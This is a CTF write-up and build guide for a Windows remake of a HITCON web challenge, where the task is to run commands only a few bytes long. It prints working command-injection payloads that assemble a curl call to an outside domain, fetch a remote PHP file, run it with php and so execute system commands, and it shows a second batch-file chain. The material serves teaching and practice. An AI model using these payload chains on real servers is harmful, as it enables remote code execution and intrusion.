## Challenge Information

- Name: Babyfirst Revenge: Remastered
- Type: Web
- Description:

```
This is a remastered edition on Windows 10 of Orange's [Babyfirst Revenge](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge) in HITCON CTF 2017.

Hint 1: the intended solution is similar to [Orange's](https://github.com/orangetw/My-CTF-Web-Challenges#solution-10).

Run C:\\getflag.exe I rea11y wan7 t0 get 7h3 f1ag plz! to get the flag.
```

- Files provided: None
- Solves: 1 / 15

## Build

1. Amazon EC2 Windows Server 2019
2. [Install IIS and CGI](https://stackify.com/how-to-host-php-on-windows-with-iis/)
  - Web Server (IIS)
    - Ppen "Turn on or off Windows features"
    - Add roles and Features Wizard
    - next, next, next
    - Server roles -> choose "Web Server (IIS)"
    - Features -> next
    - Web server role (IIS) -> next
    - Role Service -> Application development -> CGI
    - Install

3. Install PHP 7.4.1 x64 via [Microsoft’s Web Platform Installer](https://www.iis.net/downloads/microsoft/web-platform-installer)
  - `wget https://download.microsoft.com/download/8/4/9/849DBCF2-DFD9-49F5-9A19-9AEE5B29341A/WebPlatformInstaller_x64_en-US.msi -O WebPlatformInstaller_x64_en-US.msi`
  - Open Web Platform Installer -> Products -> PHP 7.4.1(x64) -> I accept
  - The PHP Manager for IIS will fail to be installed. It's safe to ignore it.
4. [Enable "Load User profile"](https://stackoverflow.com/a/46535790) such that PHP can use system command.
  - Open IIS manager
  - Select -> Application Pools node underneath the machine node (left panel)
  - Right click on the desired domainname in the application pools -> Advanced settings
  - Scroll to Process Model
  - Set Load User Profile = True
  - Stop and start the applicaiton

5. Put `index.php` in `C:\inetpub\wwwroot`
  - Delete other `iis*` files in the directory
6. Create a directory `C:\sandbox` and prevent user listing the content, but they can still access subdirectories.
  - right click -> properties -> security -> edit -> Users -> Write -> Allow -> OK, yes, OK
  - right click -> properties -> security -> advanced -> add 
  - pricipal: `IUSR` -> type: deny -> applies to: this folder only
  - show advanced permissions -> only check `list folder / read data`
  - ok, ok, ok
7. Allow user to write on etc hosts
  - `C:\windows\system32\drivers\etc\hosts`
  - Right click -> properties -> security -> edit -> Users -> Write -> Allow -> OK, yes, OK
8. Flag:
  - Copy `getflag.exe` to `C:\`
  - right click -> properties -> security -> advanced
  - disable ingeritance -> convert inhrited permissions ...
  - select `Allow Users ...` rules -> Remove
  - add -> pricipal: `IUSR` -> type: allow
  - show advanced permissions -> check `traverse folders / execute file` only
  - ok, ok, ok
9. Delete powershell history:
   - `cmd.exe /c del %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
   - clean all the file on desktop
   - clean the recycle bin

## Writeup

The payload is very similar to [Orange's intended solution](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge) but in a Windows version.

```
.>"cur^
.>"l,@^
.>"qst^
.>"r3t^
.>v.tw
dir/b>y
cmd<y>z
php z
```

1. `curl` is present in Windows Server 2019
2. comma will be automatically [split by command line](https://www.robvanderwoude.com/parameters.php#Delimiters) and it will be interpreted as the argument.
3. `@`: because the comma is not a valid character in URL, so we use `@` trick here to bypass it.
4. `qstr3tv.tw` is just a random domain.
5. `^` is used to specify [multiline command](https://stackoverflow.com/a/605724). Actually this character should be escaped but it seems to be okay in command line.
6. `dir /b` works simiarly as `ls`. List files in lexicographical order.
7. `cmd` can read commands from input

We can leverage the helper in the challenge to register the domain `/?tld=tw&domain=qstr3tv&ip=255.255.255.255`.

And make a webserver to host this file:

```
<?php
system("C:\\getflag.exe I rea11y wan7 t0 get 7h3 f1ag plz!");
?>
```

Another solution by @shw:

```
.>cur^^
.>l^^
dir/b>@
del c*
del l*
.>^ -^^
.>o^ ^^
.>p^ ^^
.>qq1^^
.>r.t^^
.>w
ren @ [
dir/b>z
copy[+z
.>b.bat
del *-*
del o^*
del p^*
del q^*
del r^*
del w
del z
copy.+[
b.>b.bat
ren p [
del p
copy.+[
b
```

## Postscript

As mentioned previously, the original idea was [Orange's challenge](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge) - execute command but only in 5 bytes. I just wonder if it's possible in Windows environment, but I can only make the payload less than 8 bytes due to `cmd<y>z`. If you know any payload less than 7 bytes please let me know (or you can create another challenge.)

For the domain helper, I know someone will have problem getting a domain because he has no credit card. Therefore, the `etc\host` trick is in consideration of fairness, to ensure that everyone can have a domain to solve this challenge!
